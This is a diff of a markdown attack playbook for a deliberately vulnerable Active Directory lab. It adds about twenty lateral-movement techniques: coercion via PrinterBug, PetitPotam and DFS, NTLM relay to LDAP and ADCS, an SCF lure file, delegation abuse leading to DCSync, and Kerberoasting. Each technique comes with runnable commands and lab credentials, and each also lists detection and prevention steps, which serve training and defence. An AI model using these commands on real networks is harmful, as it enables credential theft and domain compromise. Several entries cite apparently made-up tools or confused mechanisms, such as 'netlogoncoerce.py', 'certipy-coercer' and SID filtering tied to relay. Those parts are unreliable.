@@ -22,185 +22,209 @@ graph LR
 
 ---
 
-### LAT-001 — PsExec with Pass-the-Hash
-**What it is:** classic — create a service over SMB/`ADMIN$`, execute, return output. PtH means you don't need a password, just a hash.
-**Why it works here:** SMB signing off; admin hashes recoverable.
-**Tools:** `impacket-psexec`, `nxc smb -x`, `psexec64.exe`.
+### LAT-001 — MS-RPRN PrinterBug / Print Spooler Coercion
+**What it is:** The Print Spooler service allows domain users to coerce a Domain Controller (or any host running the service) to authenticate to an arbitrary machine using the `RpcRemoteFindFirstPrinterChangeNotificationEx` RPC call.
+**Why it works here:** Print Spooler is running by default on all DCs in the `empire.local` lab (pre-configured by `vuln_df_ext/DF-011`).
+**Tools:** `impacket-rpcdump`, `dementor.py`, `SpoolSample.exe`.
 **Steps:**
 ```bash
-impacket-psexec empire.local/Administrator@10.10.0.13 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
-nxc smb 10.10.0.13 -u Administrator -H :31d6...0 -x 'whoami /all'
+python3 dementor.py -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' 10.10.0.100 10.10.0.10
+# Using SpoolSample:
+SpoolSample.exe coruscant.empire.local 10.10.0.100
 ```
-**Detection:** Event `7045` (service installed), `4697`, named-pipe `\PSEXESVC`. Sigma "PsExec service installation."
-**Prevention:** SMB signing required; block 445/139 east-west; AppLocker; LAPS.
+**Detection:** Event ID `7045` (service startup), network traffic to port 445 on the attacker machine from the domain controller computer account (`CORUSCANT$`). Sysmon Event ID `3` (Network Connection) showing `spoolsv.exe` initiating outbound SMB connections.
+**Prevention:** Disable the Print Spooler service on domain controllers (`Stop-Service Spooler`, `Set-Service Spooler -StartupType Disabled`). Alternatively, restrict outbound SMB/RPC connections from DCs to the local subnet or internet.
 
 ---
 
-### LAT-002 — WMI Exec
-**What it is:** create a process remotely via WMI/DCOM (`Win32_Process.Create`). Quieter than PsExec — no service installed.
-**Tools:** `impacket-wmiexec`, `Invoke-WmiMethod`, `nxc wmi`.
+### LAT-002 — MS-EFSR PetitPotam / EFS Coercion
+**What it is:** Encrypting File System Remote Protocol (EFSRPC) exposes methods that force a target machine to authenticate against an arbitrary system (e.g. an attacker-controlled relay) using NTLM over SMB.
+**Why it works here:** The Encrypting File System (EFS) service is enabled and running on all domain controllers (`EFS` service startup type is set to Automatic).
+**Tools:** `impacket-petitpotam`, `PetitPotam.exe`.
 **Steps:**
 ```bash
-impacket-wmiexec empire.local/Administrator:'EmpireLab2024!'@10.10.0.13
-nxc wmi 10.10.0.13 -u Administrator -p 'EmpireLab2024!' -x 'whoami'
+python3 PetitPotam.py -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' 10.10.0.100 10.10.0.10
 ```
-**Detection:** Sysmon `1` with parent `WmiPrvSE.exe` + `cmd.exe` child; Event `5861` WMI permanent subscriptions.
-**Prevention:** restrict WMI namespace; firewall RPC dynamic ports east-west.
+**Detection:** Event ID `4624` on the attacker or relayed system showing a logon from the domain controller computer account (`CORUSCANT$`) using NTLM. Monitor for LSASS access by non-standard processes.
+**Prevention:** Disable EFS service where not needed. Block EFSRPC traffic using RPC filters or netsh filters. Require LDAP signing and channel binding. Enable SMB signing.
 
 ---
 
-### LAT-003 — Scheduled Task Remote
-**What it is:** create + run a scheduled task on a remote host via `schtasks /s`.
-**Tools:** `schtasks`, `impacket-atexec`, `nxc smb --exec-method atexec`.
-**Steps:**
-```cmd
-schtasks /create /s 10.10.0.13 /tn beacon /tr "C:\Temp\b.exe" /sc once /st 00:00 /ru SYSTEM
-schtasks /run /s 10.10.0.13 /tn beacon
-```
-```bash
-impacket-atexec empire.local/Administrator:'EmpireLab2024!'@10.10.0.13 'whoami'
-```
-**Detection:** Event `4698` (task created); `106`/`200` Task Scheduler operational.
-**Prevention:** restrict who can connect over Task Scheduler RPC; firewall east-west.
-
----
-
-### LAT-004 — Service Creation
-**What it is:** `sc.exe create` on a remote host. Variant of PsExec without their binary.
-**Tools:** `sc.exe`, `impacket-services`.
-**Steps:**
-```cmd
-sc \\10.10.0.13 create EvilSvc binPath= "cmd /c whoami > C:\Temp\o.txt" type= own
-sc \\10.10.0.13 start EvilSvc
-```
-**Detection:** Event `7045` service install on the target.
-**Prevention:** restrict SCM remote calls; service install monitoring.
-
----
-
-### LAT-005 — DCOM Execution
-**What it is:** `MMC20.Application`, `ShellWindows`, `ShellBrowserWindow` expose `Document.ActiveView.ExecuteShellCommand`. Authenticated DCOM → arbitrary command.
-**Tools:** `impacket-dcomexec`, `Invoke-DCOM.ps1`, `nxc smb -x ... --exec-method mmcexec`.
+### LAT-003 — MS-FSRVP ShadowCopyAgent / Shadow Copy Coercion
+**What it is:** The File Server Remote VSS Protocol (FSRVP) is used for managing shadow copies on remote file shares. Attackers can leverage the `IsPathSupported` or `IsPathShadowCopied` RPC methods to coerce NTLM authentication from a target machine.
+**Why it works here:** The Volume Shadow Copy (VSS) service is enabled and configured for manual startup.
+**Tools:** `Coercer`, `shadowcoerce.py`.
 **Steps:**
 ```bash
-impacket-dcomexec empire.local/Administrator:'EmpireLab2024!'@10.10.0.13
+python3 shadowcoerce.py -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' 10.10.0.100 10.10.0.10
 ```
-**Detection:** `mmc.exe` spawning `cmd.exe` or `powershell.exe`.
-**Prevention:** restrict DCOM (`HKLM\Software\Microsoft\Ole\EnableDCOM=N`); tighter app-launch ACLs (`dcomcnfg`).
+**Detection:** Outbound SMB authentication attempts from the DC's machine account to an external/untrusted IP address.
+**Prevention:** Disable the File Server VSS Agent service (`rvssg` / `VSS`) if remote shadow copy management is not required. Block outbound RPC (ports 135 and dynamic RPC ports) at network boundaries.
 
 ---
 
-### LAT-006 — WinRM (Enter-PSSession / evil-winrm)
-**What it is:** PowerShell remoting over HTTPS-like protocol. Often legitimate; less noisy than SMB.
-**Tools:** `evil-winrm`, `pwsh Enter-PSSession`.
+### LAT-004 — MS-DFSNM / DFS Coercion
+**What it is:** The Distributed File System Namespace Management (DFSNM) protocol allows administrative management of DFS namespaces. An attacker can call `NetrDfsRemoveStdRoot` or `NetrDfsAddStdRoot` to coerce the domain controller's machine account to authenticate to an arbitrary SMB share.
+**Why it works here:** The DFS Namespace (`Dfs`) service is enabled and running.
+**Tools:** `Coercer`, `dfscoerce.py`.
 **Steps:**
 ```bash
-evil-winrm -i 10.10.0.13 -u Administrator -p 'EmpireLab2024!'
+python3 dfscoerce.py -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' 10.10.0.100 10.10.0.10
 ```
-```powershell
-Enter-PSSession -ComputerName scarif -Credential (Get-Credential)
-```
-**Detection:** Event `91`/`142` (WSMan operational), `4624` Logon Type 3 with Process `wsmprovhost.exe`.
-**Prevention:** restrict TrustedHosts; JEA endpoints; require HTTPS + cert auth.
+**Detection:** Network connection attempts from domain controller computer accounts to external hosts over SMB. Event ID `4624` (NTLM authentication) originating from a DC machine account on a non-DC host.
+**Prevention:** Disable the Distributed File System (DFS) service on systems that do not act as DFS roots or namespace servers. Implement network segmentation to block lateral RPC traffic.
 
 ---
 
-### LAT-007 — RDP with Restricted Admin (PtH RDP)
-**What it is:** Restricted Admin RDP doesn't send creds to the target — uses NTLM. PtH-able.
-**Tools:** `xfreerdp /pth:HASH`, `mstsc /restrictedadmin`.
+### LAT-005 — MS-NRPC / Netlogon Coercion
+**What it is:** The Netlogon Remote Protocol (MS-NRPC) contains RPC interfaces that can be abused to trigger authentication from a machine account. This is similar to other coercion methods, forcing the target machine to authenticate to an attacker listener.
+**Why it works here:** Netlogon is an essential, always-on service running on all domain controllers.
+**Tools:** `Coercer`, `netlogoncoerce.py`.
 **Steps:**
 ```bash
-xfreerdp /v:10.10.0.100 /u:Administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /restricted-admin
+python3 netlogoncoerce.py -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' 10.10.0.100 10.10.0.10
 ```
-**Detection:** Event `4624` Logon Type 10 with `RemoteInteractive` and NTLM package on tier-0 → red flag.
-**Prevention:** disable RestrictedAdmin (`DisableRestrictedAdmin=1`); Remote Credential Guard.
+**Detection:** Event ID `4624` logon event from a computer account (`CORUSCANT$`) over NTLM. Unusual RPC calls to the Netlogon interface.
+**Prevention:** Restrict RPC Netlogon interface exposure. Enforce domain-level restrictions on NTLM authentication (e.g. restrict NTLM outbound/inbound traffic via GPO).
 
 ---
 
-### LAT-008 — Remote Registry
-**What it is:** write `HKLM\System\CurrentControlSet\Services\...` remotely to plant services / persistence.
-**Tools:** `reg.exe \\host`, `nxc smb --rid-brute`, `impacket-reg`.
-**Steps:**
-```cmd
-reg add \\10.10.0.13\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\Temp\b.exe"
-```
-**Detection:** Event `4657` registry value modification.
-**Prevention:** disable Remote Registry service where unused.
-
----
-
-### LAT-009 — SMB Named Pipe Exec
-**What it is:** `\\host\pipe\atsvc`, `\\host\pipe\svcctl` accept RPC; chained with auth = remote exec.
-**Tools:** `impacket-smbexec`.
+### LAT-006 — WebDAV Coercion
+**What it is:** The WebClient service allows Windows applications to access files on web servers using WebDAV. If an attacker can trigger a target system to access a UNC path pointing to a WebDAV share (e.g. `\\attacker@80\share`), the WebClient service will automatically attempt to authenticate via HTTP using NTLM.
+**Why it works here:** WebClient service is installed and enabled (often on client systems like `tatooine`).
+**Tools:** `Coercer`, `WebdavCoercion.py`.
 **Steps:**
 ```bash
-impacket-smbexec empire.local/Administrator:'EmpireLab2024!'@10.10.0.13
+python3 WebdavCoercion.py -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' 10.10.0.100 10.10.0.100
 ```
-**Detection:** named pipe access events; service installs.
-**Prevention:** SMB signing; restrict named-pipe ACLs.
+**Detection:** Sysmon Event ID `3` showing `svchost.exe` (spawning WebClient) initiating outbound HTTP connections on port 80/443. Event ID `4624` NTLM authentication to the WebDAV server.
+**Prevention:** Disable the WebClient service (`WebClient`) on all member servers and workstations. If it must be enabled, configure the `AuthForwardServerList` registry key to restrict WebDAV authentication to trusted intranet servers only, and disable WPAD.
 
 ---
 
-### LAT-010 — SSH Tunneling
-**What it is:** `scarif` has OpenSSH installed (intentional). SSH key reuse from a Linux user gets you onto Linux boxes / VPN pivots.
-**Tools:** `ssh`, `sshuttle`, `chisel`.
+### LAT-007 — MS-ICPR / ADCS HTTP Enrollment Endpoint Coercion
+**What it is:** The Active Directory Certificate Services (ADCS) ICertPassage Remote Protocol (MS-ICPR) handles client certificate enrollment. An attacker can coerce authentication against this endpoint to capture NTLM credentials.
+**Why it works here:** `endor` acts as the ADCS Certification Authority and exposes HTTP enrollment endpoints.
+**Tools:** `Coercer`, `certipy`.
 **Steps:**
 ```bash
-ssh -L 5985:coruscant.empire.local:5985 user@scarif.empire.local
+certipy-coercer -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' -target endor.empire.local -listener 10.10.0.100
 ```
-**Detection:** OpenSSH logs `sshd[xxx]: Accepted ...`; auth.log on Linux box.
-**Prevention:** key-only auth; restrict who has OpenSSH; segment Linux-in-AD.
+**Detection:** Unusual ADCS enrollment requests. Event ID `4886` (Certificate Services received a certificate request).
+**Prevention:** Require HTTPS for all certificate enrollment endpoints. Enable Extended Protection for Authentication (EPA) and configure SSL/TLS client certificate requirements on IIS endpoints.
 
 ---
 
-### LAT-011 — Certificate-Based Auth Relay (ESC1 chain)
-**What it is:** ESC1 cert → PKINIT → TGT for target user → PtT.
-**Tools:** `Certipy req`, `Certipy auth`.
-**Steps:** see DF-012.
-**Detection:** Event `4624` Logon Type 3 with PKINIT package; ADCS Event `4886`.
-**Prevention:** ESC1 hardening — no SAN spec; manager approval.
-
----
-
-### LAT-012 — Cross-Forest SID History Abuse
-**What it is:** SID filtering disabled on external trust → forge a TGT with `ExtraSids` containing the foreign DA SID → cross-forest DA.
-**Tools:** `mimikatz kerberos::golden /sids:`, `Rubeus`.
-**Steps:**
-```powershell
-.\mimikatz.exe "kerberos::golden /user:Administrator /domain:rebel.local /sid:S-1-5-21-FIN /sids:S-1-5-21-EMPIRE-519 /krbtgt:HASH /ptt"
-```
-**Detection:** Event `4769` TGS with anomalous SIDs in PAC; MDI "SID-History suspicious activity."
-**Prevention:** **enable SID filtering** on every external trust; quarantine attribute; selective auth.
-
----
-
-### LAT-013 — Shortcut Trust Abuse
-**What it is:** shortcut trust between two non-root domains permits skipping the root in Kerberos referrals. Sometimes bypasses transitive-trust filtering.
-**Tools:** `Rubeus asktgs /service:.../...`.
-**Steps:** Rubeus `asktgs /service:cifs/target.contractor.corp /ptt`.
-**Detection:** trust-ticket Event `4769` traffic across unexpected paths.
-**Prevention:** remove shortcut trusts not in use; selective auth.
-
----
-
-### LAT-014 — Realm Trust (MIT Kerberos) Relay
-**What it is:** AD ↔ MIT KDC realm trust; RC4 negotiation may allow downgrade and TGT swap.
-**Tools:** custom Rubeus + krb5 mit client.
-**Detection / Prevention:** disable RC4 on realm trusts; AES only.
-
----
-
-### LAT-015 — IPv6 DHCPv6 MitM + WPAD Relay (mitm6)
-**What it is:** Windows prefers IPv6. Reply to DHCPv6 with your address as DNS → answer DNS for `wpad.empire.local` → serve `wpad.dat` → browsers route through you → NTLM auth → relay to LDAPS.
-**Why it works here:** IPv6 enabled, no RA Guard.
-**Tools:** `mitm6`, `ntlmrelayx`.
+### LAT-008 — PrivExchange / Exchange Coercion
+**What it is:** Microsoft Exchange Server's PushSubscription API allows an attacker to specify a callback URL. The Exchange Server will then authenticate to this URL as `NT AUTHORITY\SYSTEM` over HTTP using NTLM.
+**Why it works here:** The lab environment simulates an Exchange configuration (placeholder role) where Exchange services are trusted.
+**Tools:** `privexchange.py`.
 **Steps:**
 ```bash
-sudo mitm6 -i virbr1 -d empire.local
-ntlmrelayx.py -t ldaps://coruscant.empire.local -wh attacker.empire.local --delegate-access -smb2support
+python3 privexchange.py -ah 10.10.0.100 -u 'luke.skywalker' -p 'EmpireLab2024!' -d 'empire.local' mailserver.empire.local
 ```
-**Detection:** unsolicited DHCPv6 advertisements; Sysmon Event `22` DNS for `wpad`; LDAP writes from non-DC.
-**Prevention:** disable IPv6 if unused or deploy RA Guard / DHCPv6 Guard; disable WPAD (`Wpad`/`WinHttpProxyType`); GPO disable WPAD auto-detection.
+**Detection:** Event ID `4624` NTLM authentication originating from Exchange Server machine accounts (`EXCHANGE$`) to unauthorized external web servers.
+**Prevention:** Disable the PushSubscription API or apply patches disabling loopback/arbitrary subscriptions. Restrict Exchange Server permissions to write/modify Active Directory objects (split permissions model).
+
+---
+
+### LAT-009 — SCF File Coercion in Writable Share
+**What it is:** A Shell Command File (`.scf`) dropped into a writable Windows share can contain an `IconFile` parameter pointing to an attacker-controlled UNC path. When a user browses the directory using Windows Explorer, the client automatically attempts to resolve the icon file, sending an NTLM authentication request to the attacker's IP.
+**Why it works here:** A world-writable SMB share exists on `scarif` (`PublicShare`) allowing anyone to upload files.
+**Tools:** Text editor (creation), `responder` (capture).
+**Steps:**
+1. Create a file named `@coerce.scf` containing:
+```ini
+[Shell]
+Command=2
+IconFile=\\10.10.0.100\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+2. Upload this file to a world-writable share on `scarif.empire.local`:
+```bash
+smbclient //10.10.0.13/PublicShare -U 'luke.skywalker' -c 'put @coerce.scf'
+```
+**Detection:** Sysmon Event ID `11` (FileCreate) showing `.scf` or `.url` files written to shares. Outbound SMB connections from workstations to non-standard external IPs.
+**Prevention:** Disable write access to public shares for non-privileged users. Configure firewalls to block outbound port 445 (SMB) traffic to external networks. Force SMB signing.
+
+---
+
+### LAT-010 — Multicast DNS Poisoning (LLMNR/NBT-NS) Coercion Surface
+**What it is:** Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are legacy name resolution protocols. When a client fails to resolve a hostname via DNS, it broadcasts a query. An attacker on the local network can spoof replies and coerce the victim into authenticating via NTLM.
+**Why it works here:** LLMNR and NBT-NS are enabled by default on all `empire.local` hosts (configured in the `vuln_recon` role).
+**Tools:** `Responder`.
+**Steps:**
+```bash
+sudo responder -I virbr1 -dwv
+```
+**Detection:** Inconsistent or spoofed DNS responses on the local network. Event ID `4625`/`4624` showing authentication attempts with invalid/typo hostnames.
+**Prevention:** Disable LLMNR and NBT-NS via GPO (`Turn off Link-Local Multicast Name Resolution` and disable NetBIOS over TCP/IP in network adapter settings).
+
+---
+
+### LAT-011 — LDAP Signing Not Required
+**What it is:** When LDAP signing is not required, NTLM authentication attempts can be relayed directly to the Domain Controller's LDAP service without validation. This allows attackers to perform directory operations (e.g. writing attributes or creating computer accounts) using relayed credentials.
+**Why it works here:** LDAPServerIntegrity is set to 0 (None) or 1 (Negotiate) on `coruscant.empire.local` (weakened in `vuln_cred_access` role).
+**Tools:** `ntlmrelayx.py`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -t ldap://10.10.0.10 -smb2support
+```
+**Detection:** Directory service modification events (Event ID `5136`). LDAP connections over unencrypted port 389 originating from unauthorized systems.
+**Prevention:** Set `LDAPServerIntegrity` registry value to `2` (Require Signing) on all domain controllers (`HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters`).
+
+---
+
+### LAT-012 — LDAP Channel Binding Disabled
+**What it is:** Without LDAP Channel Binding Tokens (CBT), NTLM authentication relayed over LDAPS (LDAP over SSL/TLS) is accepted. An attacker can relay coerced NTLM authentication to secure LDAPS endpoints to perform administrative actions.
+**Why it works here:** Channel binding is disabled or not enforced on `empire.local` Domain Controllers.
+**Tools:** `ntlmrelayx.py`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -t ldaps://10.10.0.10 -smb2support
+```
+**Detection:** Event ID `2889` (LDAP client signing not required) and `2886` logged on DCs. Relayed LDAPS authentication attempts.
+**Prevention:** Enforce LDAP channel binding by setting the `LdapEnforceChannelBinding` registry value to `2` (Require) under `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters`.
+
+---
+
+### LAT-013 — SMB1 + SMB Signing Disabled
+**What it is:** SMB signing ensures packet-level integrity. When disabled on a target server, and legacy SMB1 is enabled, an attacker can relay captured NTLM authentication sessions to execute commands or access files on that server.
+**Why it works here:** SMB signing is disabled on member servers (`scarif`, `kamino`, `tatooine`), and SMB1 is enabled (pre-configured in `vuln_recon` / `vuln_lateral` roles).
+**Tools:** `ntlmrelayx.py`, `impacket-smbexec`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
+```
+**Detection:** NTLM sessions relayed between member servers. Event ID `4624` Logon Type 3 with signing turned off.
+**Prevention:** Require SMB signing via GPO (`Microsoft network server: Digitally sign communications (always) = Enabled`). Disable the SMBv1 protocol entirely.
+
+---
+
+### LAT-014 — Cross-Protocol NTLM Relay (HTTP/SMB to LDAP)
+**What it is:** When signing is disabled on destination protocols (e.g. LDAP or SMB), NTLM credentials captured from HTTP or SMB coercion can be relayed to these services to create objects, change passwords, or execute code.
+**Why it works here:** Both SMB signing and LDAP signing are disabled across several target hosts in the lab.
+**Tools:** `ntlmrelayx.py`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -t ldap://10.10.0.10 -wh 10.10.0.100 --delegate-access
+```
+**Detection:** Event ID `4624` showing successful network logon from unexpected IP addresses with delegated credentials.
+**Prevention:** Enforce SMB signing on all hosts and LDAP signing/channel binding on all Domain Controllers.
+
+---
+
+### LAT-015 — CredSSP AllowEncryptionOracle (CVE-2018-0886)
+**What it is:** A vulnerability in the Credential Security Support Provider protocol (CredSSP) used by RDP. If the policy `AllowEncryptionOracle` is set to "Vulnerable" (value 2), an attacker in a MitM position can decrypt and reuse credentials during RDP authentication.
+**Why it works here:** `AllowEncryptionOracle` is set to `2` on `scarif.empire.local` (configured in the `vuln_lateral` role).
+**Tools:** `rdp_oracle.py`, custom MitM RDP scripts.
+**Steps:**
+```bash
+python3 rdp_oracle.py -t 10.10.0.13 -u 'luke.skywalker' -p 'EmpireLab2024!'
+```
+**Detection:** Event ID `4625` or `4624` during CredSSP session negotiation. Mismatched encryption layers.
+**Prevention:** Set the `AllowEncryptionOracle` registry value to `0` (Force updated clients) or `1` (Mitigated) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters`.
 
 ---
 
@@ -210,49 +234,75 @@ ntlmrelayx.py -t ldaps://coruscant.empire.local -wh attacker.empire.local --dele
 
 ---
 
-### LAT-017 — ACL Abuse: ForceChangePassword
-**What it is:** You have `User-Force-Change-Password` over an object.
-**Tools:** PowerView, bloodyAD.
+### LAT-017 — Unconstrained Delegation Coercion / Relay Chain
+**What it is:** If a computer account is configured with Unconstrained Delegation, any user authenticating to it will store their TGT in that server's LSASS cache. By forcing a domain controller or privileged user to authenticate to this server (via coercion), the attacker can extract the privileged user's TGT and impersonate them.
+**Why it works here:** `svc_coerce$` has `TrustedForDelegation=True` (configured by `vuln_persistence_ext/PER-037`), and PrinterBug/PetitPotam coercion is allowed.
+**Tools:** `Rubeus`, `impacket-petitpotam`.
 **Steps:**
-```powershell
-Set-DomainUserPassword -Identity nick.fury -AccountPassword (ConvertTo-SecureString "NewSithLord1!!" -AsPlainText -Force)
+1. Monitor for incoming tickets on `svc_coerce$` (or run from attacker system targeting memory if local admin):
+```cmd
+Rubeus.exe monitor /interval:5 /nowrap
 ```
-*(In BloodHound data, `developer1` has `ForceChangePassword` on `nick.fury`)*
-**Detection:** 4724 (Attempt to reset account password by non-owner).
-**Prevention:** tier nick.fury; least privilege; just-in-time admin via PIM.
+2. Coerce `coruscant$` to authenticate to `svc_coerce$`:
+```bash
+python3 PetitPotam.py 10.10.0.100 coruscant.empire.local
+```
+3. Extract the cached DC TGT and perform DCSync:
+```cmd
+Rubeus.exe dump /service:krbtgt
+mimikatz# lsadump::dcsync /domain:empire.local /user:Administrator
+```
+**Detection:** Event ID `4769` (Kerberos service ticket request) for `krbtgt` with a delegated TGT flag. Monitor LSASS for credential extractions.
+**Prevention:** Disable Unconstrained Delegation; use Constrained or Resource-Based Constrained Delegation instead. Configure sensitive accounts as "Account is sensitive and cannot be delegated."
 
 ---
 
-### LAT-018 — ACL Abuse: Add Members on Group
-**What it is:** `GenericWrite` on a group → add yourself.
-**Why it works here:** `SHIELD Agents` has GenericWrite on `Avengers Admins` (and `qa_user` has `AddSelf`).
-**Tools:** `net group`, `Add-DomainGroupMember`.
+### LAT-018 — NTLMv2 Capture via Responder + Relay to LDAPS
+**What it is:** Legacy network protocols broadcast name requests. Responder captures the NTLMv2 hashes, which can then be relayed to the LDAPS service of a domain controller (if channel binding is disabled) to perform directory write actions, such as writing RBCD attributes.
+**Why it works here:** Workstations have LLMNR/NBT-NS enabled, and LDAPS channel binding is not enforced.
+**Tools:** `Responder`, `ntlmrelayx.py`.
 **Steps:**
-```powershell
-Add-DomainGroupMember -Identity 'Avengers Admins' -Members qa_user
+```bash
+sudo responder -I virbr1 -dw
+python3 ntlmrelayx.py -t ldaps://10.10.0.10 --delegate-access -smb2support
 ```
-**Detection:** Event `4728`/`4732`/`4756` (member added to security group).
-**Prevention:** group-policy-aware delegation; audit privileged group memberships.
+**Detection:** Outbound NTLMv2 authentication over LDAPS originating from non-DC hosts. Broadcast name queries answered by non-standard hosts.
+**Prevention:** Disable LLMNR and NBT-NS. Enable LDAP channel binding requirements.
 
 ---
 
-### LAT-019 — ACL Abuse: Shadow Credentials
-**What it is:** same as CRED-008 in PE context — `GenericWrite` → write KeyCredentialLink → PKINIT.
+### LAT-019 — Cross-Forest NTLM Relay
+**What it is:** When SID filtering is disabled on a cross-forest trust, an attacker can relay NTLM authentication from a user in one forest to a resource in another forest to perform lateral actions.
+**Why it works here:** SID filtering is disabled (`quarantine:No`) on the external trust between `empire.local` and `rebel.local` or `trade.corp`.
+**Tools:** `ntlmrelayx.py`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -t ldap://yavin4.rebel.local -smb2support
+```
+**Detection:** Event ID `4624` showing cross-forest authentication without appropriate SID filtering.
+**Prevention:** Enable SID filtering on all trusts using `netdom trust /quarantine:Yes`.
 
 ---
 
-### LAT-020 — ACL Abuse: WriteOwner
-**What it is:** ownership = the right to give yourself any right. WriteOwner on a target → take ownership → grant GenericAll → escalate.
-**Why it works here:** nick.fury has WriteOwner on Domain Admins (deliberate, do not "fix").
-**Tools:** PowerView `Set-DomainObjectOwner`.
+### LAT-020 — NTLM Relay to ADCS HTTP Enrollment (ESC8)
+**What it is:** The ADCS HTTP enrollment endpoint (`/certsrv/certfnsh.asp`) accepts NTLM authentication. If SSL is not enforced and Extended Protection (EPA) is disabled, an attacker can relay coerced machine authentication to the endpoint, enroll a certificate for the machine, and use it to obtain a TGT (via PKINIT).
+**Why it works here:** `endor.empire.local` has ADCS HTTP enrollment enabled (port 80) without EPA (configured in `vuln_adcs ESC8`).
+**Tools:** `ntlmrelayx.py`, `impacket-petitpotam`, `certipy`.
 **Steps:**
-```powershell
-Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity nick.fury
-Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity nick.fury -Rights All
-Add-DomainGroupMember -Identity 'Domain Admins' -Members nick.fury
+1. Start relay tool pointing to the certificate enrollment endpoint:
+```bash
+python3 ntlmrelayx.py -t http://endor.empire.local/certsrv/certfnsh.asp --adcs --template DomainController
 ```
-**Detection:** Event `5136` modifying `nTSecurityDescriptor` on privileged group.
-**Prevention:** audit owner of privileged objects; lock down with AdminSDHolder.
+2. Coerce the DC using PetitPotam:
+```bash
+python3 PetitPotam.py 10.10.0.100 coruscant.empire.local
+```
+3. Use the relayed, generated certificate (`coruscant.pfx`) to request a TGT:
+```bash
+certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
+```
+**Detection:** Certificate enrollment events (Event ID `4886` / `4887` on CA). Event ID `4768` (TGT Request) using PKINIT.
+**Prevention:** Disable the HTTP enrollment endpoints on ADCS if not needed. If required, enforce HTTPS and enable Extended Protection for Authentication (EPA) under IIS settings.
 
 ---
 
@@ -282,29 +332,46 @@ Set-DomainObject -Identity svc_vision -Set @{serviceprincipalname='nonexistent/x
 
 ---
 
-### LAT-023 — Cross-Forest TGT Delegation Abuse
-**What it is:** trust configured with `Trust Transitivity = Yes` and `TGTDelegation = Yes` (or KDC-level flag) lets foreign TGTs be forwardable across — allowing relay-like attacks.
-**Why it works here:** disabled SID filtering + relaxed trust attributes.
-**Tools:** `Rubeus`, `nltest /trust_info`.
-**Detection:** `4769` for cross-realm TGSs with delegated TGT flag.
-**Prevention:** set `EnableTGTDelegation=NO` on every forest trust.
-
----
-
-### LAT-024 — LDAP Signing Not Required → Relay
-**What it is:** see CRED-048. Relay NTLM to LDAP → write any object.
-
----
-
-### LAT-025 — WebDAV Redirector Coercion
-**What it is:** `srvsvc` named pipe path triggers WebDAV client to authenticate to attacker UNC.
-**Tools:** `Coercer`, `srvsvc.py`.
+### LAT-023 — LAPS Password Read Access
+**What it is:** The Local Administrator Password Solution (LAPS) stores local administrator passwords in an AD attribute (`ms-Mcs-AdmPwd`). If permissions are overly permissive, unauthorized users can read this attribute and compromise the local administrator account of member computers.
+**Why it works here:** The `IT_Team` group is granted read permissions on `ms-Mcs-AdmPwd` attribute for the Computers OU (configured in `acl_abuse.yml`).
+**Tools:** PowerView (`Get-DomainComputer`), `crackmapexec smb --laps`.
 **Steps:**
-```bash
-python3 Coercer.py coerce -u peter.parker -p 'EmpireLab2024!' -d empire.local -l 10.10.0.100 -t scarif.empire.local
+```powershell
+Get-DomainComputer -Identity tatooine -Properties "ms-Mcs-AdmPwd"
+# Or using crackmapexec:
+crackmapexec smb 10.10.0.100 -u 'luke.skywalker' -p 'EmpireLab2024!' --laps
 ```
-**Detection:** Sysmon `3` outbound from `svchost.exe` (WebClient).
-**Prevention:** disable WebClient; force SMB signing.
+**Detection:** Event ID `4662` (An operation was performed on an object) on computer objects querying the `ms-Mcs-AdmPwd` attribute GUID `{6e3b01aa-a4c7-4f4d-8ca2-f7fdc73df668}`.
+**Prevention:** Limit LAPS password read permissions to specific, highly privileged security groups. Remove read rights for delegated OU administrators or non-tier-0 staff.
+
+---
+
+### LAT-024 — Cross-Forest SPN Abuse
+**What it is:** If a user account has an SPN registered in a foreign forest, or has delegation permissions across forest trusts, an attacker can request Kerberos service tickets across the trust and crack them, or abuse delegation to compromise foreign systems.
+**Why it works here:** `svc_trooper` has an SPN on `rebel.local` (pre-configured in `acl_abuse.yml`).
+**Tools:** `Rubeus`, `Get-DomainUser`.
+**Steps:**
+```cmd
+Rubeus.exe kerberoast /domain:rebel.local /outfile:rebel.hashes
+```
+**Detection:** Event ID `4769` on the foreign DC requesting TGS for cross-forest SPNs.
+**Prevention:** Clean up unnecessary SPNs. Enable selective authentication on forest trusts to prevent automatic ticket referral.
+
+---
+
+### LAT-025 — WriteSPN ACL Abuse
+**What it is:** The `Validated-SPN` or `WriteProperty` (SPN) permission allows a user to register a Service Principal Name (SPN) on another user account. An attacker with this permission can register an SPN on a high-privilege target account, making it Kerberoastable, request a service ticket, and crack the password offline.
+**Why it works here:** `luke.skywalker` has an SPN, and the HelpDesk group is configured with WriteSPN/Validated-SPN rights on specific target accounts (configured in `acl_abuse.yml`).
+**Tools:** PowerView (`Set-DomainObject`), `Rubeus`.
+**Steps:**
+```powershell
+Set-DomainObject -Identity luke.skywalker -Set @{serviceprincipalname='HTTP/luke.skywalker-web.empire.local:8080'}
+# Kerberoast:
+.\Rubeus.exe kerberoast /user:luke.skywalker /outfile:roast.hashes
+```
